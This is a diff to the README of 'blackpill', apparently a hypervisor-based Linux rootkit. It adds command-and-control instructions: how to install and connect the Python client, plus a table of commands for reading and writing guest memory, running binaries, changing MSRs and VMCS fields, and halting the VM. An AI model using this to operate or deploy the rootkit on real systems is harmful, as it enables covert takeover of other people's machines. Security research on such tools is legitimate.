@@ -126,9 +126,39 @@ $ modprobe blackpill
 $ dmesg
 ```
 
-## Usage
+## C2 Usage
 
-todo
+Setup the python client :
+```shell
+cd blackpill-c2
+poetry install
+poetry shell
+python client.py
+```
+After launching the client with your args ([ip] [port]) you should get :
+
+```python
+➜ python client.py 0.0.0.0 1339
+Connected to rootkit!
+```
+Then you can use the help command to display available commands :
+```python
+blackpill: help
+Available Commands
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Command                             ┃ Description                                             ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│ read_virt_memory <address>          │ Read 4 bytes (32 bits) memory at 'address'              │
+│ write_virt_memory <address> <value> │ Write 4 bytes (32 bits) memory at 'address'             │
+│ launch_userland_binary <path>       │ Launch a userland binary at 'path'                      │
+│ change_msr <msr> <value>            │ Change the value of a Model Specific Register (MSR)     │
+│ read_phys_memory <address> <value>  │ Read 4 bytes (32 bits) of physical memory at 'address'  │
+│ write_phys_memory <address> <value> │ Write 4 bytes (32 bits) of physical memory at 'address' │
+│ stop_execution                      │ Stop the execution of the guest VM                      │
+│ change_vmcs_field <field> <value>   │ Change a VMCS field to 'value'                          │
+│ help                                │ Show this help message                                  │
+└─────────────────────────────────────┴─────────────────────────────────────────────────────────┘
+```
 
 ## Credits
 
